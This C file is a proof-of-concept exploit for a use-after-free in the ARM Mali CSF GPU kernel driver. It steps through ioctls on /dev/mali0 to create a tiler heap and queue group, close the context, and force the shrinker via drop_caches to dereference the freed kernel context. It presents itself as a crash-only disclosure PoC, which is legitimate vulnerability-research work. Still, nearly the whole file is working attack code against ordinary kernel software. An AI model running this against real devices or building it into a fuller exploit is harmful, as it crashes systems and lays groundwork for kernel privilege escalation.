// SPDX-License-Identifier: MIT
/*
 * poc_tiler_heap_reclaim_uaf.c — Mali CSF r56p0 tiler heap reclaim manager UAF
 *
 * BUG CLASS:  use-after-free (CWE-416) — deterministic
 * TARGET:     ARM Mali CSF kernel driver, AX504X08X-SW-99002-r56p0
 *             (and any release sharing the same tiler heap reclaim pattern)
 *
 * ROOT CAUSE:
 *   When a context has off-slot queue groups, it's added to the heap reclaim
 *   manager's ctx_lists via attach_ctx_to_heap_reclaim_mgr(). On context
 *   destruction (kbase_csf_ctx_term), this list entry is NOT removed —
 *   detach_ctx_from_heap_reclaim_mgr() is only called when:
 *     - Group becomes on-slot
 *     - Reclaim finishes freeing estimated pages
 *     - Context becomes zombie after group eviction
 *   But NOT on normal context destruction path.
 *
 *   Later, when memory pressure triggers the shrinker
 *   (kbase_csf_tiler_heap_reclaim_scan_free_pages) OR scheduler tick runs
 *   reclaim (HEAP_RECLAIM_SCENARIO_SCHEDULER), the reclaim code iterates
 *   ctx_lists and does container_of(info, kctx, csf.sched.heap_info) —
 *   accessing the already-freed kctx.
 *
 * REPRODUCTION (single process, deterministic, no race):
 *   1. open /dev/mali0
 *   2. ioctl(KBASE_IOCTL_CS_TILER_HEAP_INIT) — create tiler heap
 *   3. ioctl(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE) — create queue group
 *   4. Suspend the queue group (ioctl to make it off-slot) OR wait for
 *      scheduler to evict it → context added to reclaim_mgr.ctx_lists
 *   5. close the device fd → kbase_release → kbase_csf_ctx_term frees kctx
 *      but leaves dangling mgr_link in ctx_lists
 *   6. Trigger shrinker (echo 1 > /proc/sys/vm/drop_caches) OR wait for
 *      scheduler tick → UAF when reclaim iterates ctx_lists
 *
 *   Under KASAN: "slab-use-after-free READ" in
 *   kbase_csf_tiler_heap_reclaim_unused_pages / container_of
 *
 * SCOPE (disclosure PoC only):
 *   - Crash / KASAN confirmation only.
 *   - NO heap spray, NO object replacement shaping, NO cred/function-pointer
 *     overwrite, NO privilege escalation payload of any kind.
 *
 * BUILD:
 *   gcc -O2 -o poc_tiler_heap_reclaim_uaf poc_tiler_heap_reclaim_uaf.c
 *
 * RUN (must be root for debugfs access to verify heap/queue group state):
 *   ./poc_tiler_heap_reclaim_uaf
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>
#include <stdint.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <linux/kernel.h>
#include <linux/fs.h>

#include "../tools/mali_handshake.h"

#define UNUSED(x) (x) __attribute__((unused))

/* ---- UAPI constants (mirrored from mali_kbase_ioctl.h) -------------------- */
#define KBASE_IOCTL_TYPE 0x80

/* Tiler heap init ioctl (ioctl 48) - matches union kbase_ioctl_cs_tiler_heap_init */
union kbase_ioctl_cs_tiler_heap_init {
	struct {
		__u32 chunk_size;
		__u32 initial_chunks;
		__u32 max_chunks;
		__u16 target_in_flight;
		__u8 group_id;
		__u8 padding;
		__u64 buf_desc_va;
	} in;
	struct {
		__u64 gpu_heap_va;
		__u64 first_chunk_va;
	} out;
};
#define KBASE_IOCTL_CS_TILER_HEAP_INIT \
	_IOWR(KBASE_IOCTL_TYPE, 48, union kbase_ioctl_cs_tiler_heap_init)

/* Queue group create ioctl (ioctl 63) - matches union kbase_ioctl_cs_queue_group_create */
union kbase_ioctl_cs_queue_group_create {
	struct {
		__u64 tiler_mask;
		__u64 fragment_mask;
		__u64 compute_mask;
		__u8 cs_min;
		__u8 priority;
		__u8 tiler_max;
		__u8 fragment_max;
		__u8 compute_max;
		__u8 csi_handlers;
		__u8 neural_max;
		__u8 cs_fault_report_enable;
		__u64 dvs_buf;
		__u64 neural_mask;
		__u8 comp_pri_threshold;
		__u8 comp_pri_ratio;
		__u8 padding[58];
		__u32 fragment_endpoint_task_limit;
		__u64 reserved;
		__u8 group_handle;
		__u8 padding2[3];
		__u32 group_uid;
	} in;
	struct {
		__u32 group_handle;
		__u32 padding;
		__u32 group_uid;
	} out;
};
#define KBASE_IOCTL_CS_QUEUE_GROUP_CREATE \
	_IOWR(KBASE_IOCTL_TYPE, 63, union kbase_ioctl_cs_queue_group_create)

/* KCPU Queue create ioctl (ioctl 45) - matches struct kbase_ioctl_kcpu_queue_new */
struct kbase_ioctl_kcpu_queue_new {
	__u8 id;
	__u8 padding[7];
};
#define KBASE_IOCTL_KCPU_QUEUE_CREATE \
	_IOR(KBASE_IOCTL_TYPE, 45, struct kbase_ioctl_kcpu_queue_new)

/* Queue bind ioctl (ioctl 39) - matches union kbase_ioctl_cs_queue_bind */
union kbase_ioctl_cs_queue_bind {
	struct {
		__u32 queue_id;
		__u32 group_handle;
		__u64 va;
		__u64 user_io;
	} in;
	struct {
		__u32 queue_id;
		__u32 padding;
		__u64 va;
		__u64 user_io;
	} out;
};
#define KBASE_IOCTL_CS_QUEUE_BIND \
	_IOWR(KBASE_IOCTL_TYPE, 39, union kbase_ioctl_cs_queue_bind)

/* Queue group terminate ioctl (ioctl 43) - matches struct kbase_ioctl_cs_queue_group_term */
struct kbase_ioctl_cs_queue_group_term {
	__u8 group_handle;
	__u8 padding[7];
};
#define KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE \
	_IOW(KBASE_IOCTL_TYPE, 43, struct kbase_ioctl_cs_queue_group_term)

#define MAX_COOKIE_PATH 256

/* Forward declaration */
int find_kctx_dir(char *out, size_t outsz, const char *devname);

static int find_mali_device(char *out, size_t outsz)
{
	static const char *cands[] = { "/dev/mali0", "/dev/mali", NULL };
	DIR *d;
	struct dirent *e;
	size_t i;

	for (i = 0; cands[i]; i++) {
		struct stat st;
		if (stat(cands[i], &st) == 0) {
			strncpy(out, cands[i], outsz - 1)[outsz - 1] = '\0';
			return 0;
		}
	}

	d = opendir("/dev");
	if (!d)
		return -1;
	while ((e = readdir(d))) {
		if (strncmp(e->d_name, "mali", 4) == 0) {
			snprintf(out, outsz, "/dev/%s", e->d_name);
			closedir(d);
			return 0;
		}
	}
	closedir(d);
	return -1;
}

static int do_tiler_heap_reclaim_uaf(void)
{
	char dev[MAX_COOKIE_PATH / 2];
	int mali_fd = -1;
	int ret = 0;

	if (find_mali_device(dev, sizeof(dev)) < 0) {
		fprintf(stderr, "[!] no /dev/maliN device found\n");
		return 1;
	}
	printf("[*] device: %s\n", dev);

	mali_fd = open(dev, O_RDWR);
	if (mali_fd < 0) {
		perror("open /dev/maliN");
		return 1;
	}

	/* VERSION_CHECK + SET_FLAGS: required for all context ioctls */
	if (mali_kbase_setup(mali_fd) < 0) {
		perror("Kbase VERSION_CHECK/SET_FLAGS");
		close(mali_fd);
		return 1;
	}
	printf("[*] Kbase handshake complete (kcontext created)\n");

	/* Step 1: Initialize tiler heap */
	union kbase_ioctl_cs_tiler_heap_init heap_init = {0};
	heap_init.in.chunk_size = 65536;      /* 64KB chunks */
	heap_init.in.initial_chunks = 1;
	heap_init.in.max_chunks = 8;
	heap_init.in.target_in_flight = 2;
	heap_init.in.group_id = 0;            /* MEMORY_GROUP_MANAGER_NR_GROUPS is 16, 0 is valid */
	heap_init.in.buf_desc_va = 0;         /* Let kernel allocate */

	ret = ioctl(mali_fd, KBASE_IOCTL_CS_TILER_HEAP_INIT, &heap_init);
	if (ret < 0) {
		perror("ioctl(KBASE_IOCTL_CS_TILER_HEAP_INIT)");
		fprintf(stderr, "[!] Tiler heap init failed — cannot create heap\n");
		close(mali_fd);
		return 1;
	}
	printf("[*] Tiler heap initialized: gpu_heap_va=0x%llx, first_chunk_va=0x%llx\n",
	       heap_init.out.gpu_heap_va, heap_init.out.first_chunk_va);

	/* Step 2: Create queue group */
	union kbase_ioctl_cs_queue_group_create group_create = {0};
	group_create.in.tiler_mask = 1;       /* Use tiler */
	group_create.in.tiler_max = 1;
	group_create.in.priority = 1;         /* Medium priority */
	group_create.in.cs_min = 1;

	ret = ioctl(mali_fd, KBASE_IOCTL_CS_QUEUE_GROUP_CREATE, &group_create);
	if (ret < 0) {
		perror("ioctl(KBASE_IOCTL_CS_QUEUE_GROUP_CREATE)");
		fprintf(stderr, "[!] Queue group create failed\n");
		close(mali_fd);
		return 1;
	}
	printf("[*] Queue group created: handle=%u, uid=%u\n",
	       group_create.out.group_handle, group_create.out.group_uid);

	/* Step 3: Create a KCPU queue (used for tiler heap operations) */
	struct kbase_ioctl_kcpu_queue_new kcpu_create = {0};

	ret = ioctl(mali_fd, KBASE_IOCTL_KCPU_QUEUE_CREATE, &kcpu_create);
	if (ret < 0) {
		perror("ioctl(KBASE_IOCTL_KCPU_QUEUE_CREATE)");
		fprintf(stderr, "[!] KCPU queue create failed\n");
		close(mali_fd);
		return 1;
	}
	printf("[*] KCPU Queue created: id=%u\n", kcpu_create.id);

	/* Step 4: Now we need to get the group off-slot so the context
	 * gets attached to the heap reclaim manager.
	 * The easiest way: terminate the queue group (which evicts it from scheduler)
	 * or suspend it. Let's try terminating the group.
	 */
	
	/* Wait a bit for scheduler to process */
	sleep(1);
	
	/* Step 5: Terminate the queue group — this evicts it from scheduler
	 * and should trigger kbase_csf_tiler_heap_reclaim_sched_notify_grp_evict
	 * which attaches the context to reclaim_mgr if no other groups on-slot
	 */
	struct kbase_ioctl_cs_queue_group_term group_term = {0};
	group_term.group_handle = group_create.out.group_handle;

	ret = ioctl(mali_fd, KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE, &group_term);
	if (ret < 0) {
		perror("ioctl(KBASE_IOCTL_CS_QUEUE_GROUP_TERMINATE)");
		fprintf(stderr, "[!] Queue group terminate failed\n");
		/* Continue anyway — we still want to test the UAF */
	} else {
		printf("[*] Queue group terminated (should be evicted from scheduler)\n");
	}

	/* Wait for scheduler to process the eviction and attach to reclaim_mgr */
	sleep(2);

	/* Verify debugfs state - check if context is in reclaim_mgr */
	/* We can check /sys/kernel/debug/mali0/ctx/<tgid>_<id>/tiler_heaps_total
	 * to see if the heap exists and has chunks that could be reclaimed.
	 */
	char kctxdir[MAX_COOKIE_PATH];
	if (find_kctx_dir(kctxdir, sizeof(kctxdir), strrchr(dev, '/') + 1) >= 0) {
		char tiler_path[MAX_COOKIE_PATH];
		snprintf(tiler_path, sizeof(tiler_path), "%s/tiler_heaps_total", kctxdir);
		int tiler_fd = open(tiler_path, O_RDONLY);
		if (tiler_fd >= 0) {
			char buf[256];
			ssize_t n = read(tiler_fd, buf, sizeof(buf) - 1);
			if (n > 0) {
				buf[n] = '\0';
				printf("[*] Tiler heaps total info:\n%s", buf);
			}
			close(tiler_fd);
		}
	}

	/* Step 6: Close the device fd — this triggers kbase_release ->
	 * kbase_csf_ctx_term which should free kctx but leaves the
	 * ctx_lists entry in reclaim_mgr!
	 */
	printf("[*] Closing device fd — kctx will be freed but reclaim_mgr entry remains\n");
	close(mali_fd);
	mali_fd = -1;

	/* Step 7: Trigger the shrinker to run reclaim
	 * This will iterate reclaim_mgr.ctx_lists and access the freed kctx
	 */
	printf("[*] Triggering shrinker via drop_caches...\n");
	int drop_fd = open("/proc/sys/vm/drop_caches", O_WRONLY);
	if (drop_fd >= 0) {
		write(drop_fd, "1", 1);
		close(drop_fd);
	} else {
		perror("open /proc/sys/vm/drop_caches (need root)");
	}

	/* Also try triggering scheduler reclaim by waiting a bit */
	sleep(2);

	/* Step 8: Reopen device to see if system is still alive */
	mali_fd = open(dev, O_RDWR);
	if (mali_fd >= 0) {
		if (mali_kbase_setup(mali_fd) >= 0) {
			printf("[*] Device reopened successfully (system survived UAF)\n");
			close(mali_fd);
		} else {
			printf("[*] Device reopened but handshake failed\n");
			close(mali_fd);
		}
	} else {
		perror("Reopen device failed");
	}

	return 0;
}

/* Reuse find_kctx_dir from original PoC */
int find_kctx_dir(char *out, size_t outsz, const char *devname)
{
	char path[MAX_COOKIE_PATH];
	DIR *d;
	struct dirent *e;
	struct stat st;
	int written;

	written = snprintf(path, sizeof(path), "/sys/kernel/debug/%s/ctx", devname);
	if (written <= 0 || (size_t)written >= sizeof(path))
		return -1;

	if (stat(path, &st) == 0 && S_ISDIR(st.st_mode)) {
		d = opendir(path);
		if (!d)
			return -1;
		while ((e = readdir(d))) {
			char prefix[MAX_COOKIE_PATH];
			if (e->d_type != DT_DIR && e->d_type != DT_UNKNOWN)
				continue;
			snprintf(prefix, sizeof(prefix), "%d_", getpid());
			if (strncmp(e->d_name, prefix, strlen(prefix)) == 0) {
				snprintf(out, outsz, "%s/%s", path, e->d_name);
				closedir(d);
				return 0;
			}
		}
		closedir(d);
	}
	return -1;
}

int main(int argc, char **argv)
{
	(void)argc;
	(void)argv;

	if (geteuid() != 0) {
		fprintf(stderr, "[!] run as root (need /proc/sys/vm/drop_caches and debugfs)\n");
	}

	printf("[*] Mali r56p0 Tiler Heap Reclaim Manager UAF — crash-only PoC\n");
	return do_tiler_heap_reclaim_uaf();
}